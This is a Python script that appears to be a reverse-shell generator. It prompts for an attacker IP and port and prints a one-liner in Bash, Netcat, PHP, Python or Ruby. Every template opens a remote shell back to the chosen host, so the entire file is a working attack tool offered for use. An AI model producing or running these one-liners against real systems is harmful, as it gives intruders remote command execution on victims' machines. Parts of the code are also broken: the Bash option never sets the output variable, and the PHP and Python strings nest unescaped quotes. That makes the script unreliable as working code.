#!/bin/python3.9
import time
import shlex
import subprocess

# Just for aesthetics
banner = '''
######################################################################
######################################################################
######################################################################
Shell Generator#######################################################
Please wait three seconds#############################################
######################################################################
######################################################################
######################################################################
'''
print(banner)
time.sleep(3)
clear = "clear"
subprocess.call(shlex.split(clear))

# Pick a language for the shell
options = '''
Your options are:

1. Bash
2. Netcat (nc)
3. PHP
4. Python
5. Ruby
'''

print(options)

choice = input("Which one would you like to generate? (Pick by number) ")

# Enter your info for the reverse connection
RHOSTS = input("Enter your IP: ")
RPORT = input("Enter port: ")

# Bash shell
if choice == "1":
    bash = f'''
bash -i >& /dev/tcp/{RHOSTS}/{RPORT} 0>&1'''

# Netcat shell
elif choice == "2":
    netcat = f'''
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {RHOSTS} {RPORT} >/tmp/f'''
    shell = netcat

# PHP shell
elif choice == "3":
    php = f'''
php -r "$sock=fsockopen('{RHOSTS}', {RPORT});exec("bash <&3 >&3 2>&3");"'''
    shell = php

# Python shell
elif choice == "4":
    python = f'''
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{RHOSTS}",{RPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")"''' 
    shell = python

# Ruby shell
elif choice == "5":
    ruby = f'''
ruby -rsocket -e"spawn('sh',[:in,:out,:err]=>TCPSocket.new('{RHOSTS}',{RPORT}))"'''
    shell = ruby

# In case there's a mistake
else:
    print("Error...")
    exit()

# Display the one liner
print(f"Your shellcode: {shell}")

# Once again for aesthetics
time.sleep(3)
print("Have a nice day...")
exit()
